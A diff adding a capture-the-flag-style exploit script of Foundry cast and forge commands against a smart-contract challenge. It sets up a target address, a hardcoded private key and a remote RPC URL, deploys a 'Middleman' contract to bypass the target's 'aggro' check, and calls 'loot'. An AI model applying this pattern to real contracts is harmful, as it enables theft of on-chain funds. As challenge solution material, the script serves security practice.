@@ -1,0 +1,20 @@
+target=0xbAF0fb20604d822f8d4E1A35250669Ca5b8D8038 && \
+private_key=0xacedef285aefb08425541da828571d9875ff5faa1dac3afabae6fb072800db65 && \
+rpc="http://94.237.54.192:37617/rpc" && \
+middleman=0x59bBCd9a311f809206e5C71f15c32b66f2fF9275 && \
+
+cast call $target "aggro()(address)" --rpc-url $rpc
+0x0000000000000000000000000000000000000000
+
+cast send $target "attack(uint256)" 1000 --private-key $private_key --rpc-url $rpc
+
+cast call $target "aggro()(address)" --rpc-url $rpc
+0xB7d9E9a1CA7089F501E60aF5788739af085aD4A1
+
+cast call $target "lifePoints()(uint256)" --rpc-url $rpc
+1000
+
+forge create src/Middleman.sol:Middleman --rpc-url $rpc --private-key $private_key --no-cache --broadcast
+cast send $middleman "attack(uint256)" 1000 --private-key $private_key --rpc-url $rpc
+cast call $target "lifePoints()(uint256)" 1000 --rpc-url $rpc
+cast send $target "loot()()" --rpc-url $rpc --private-key $private_key
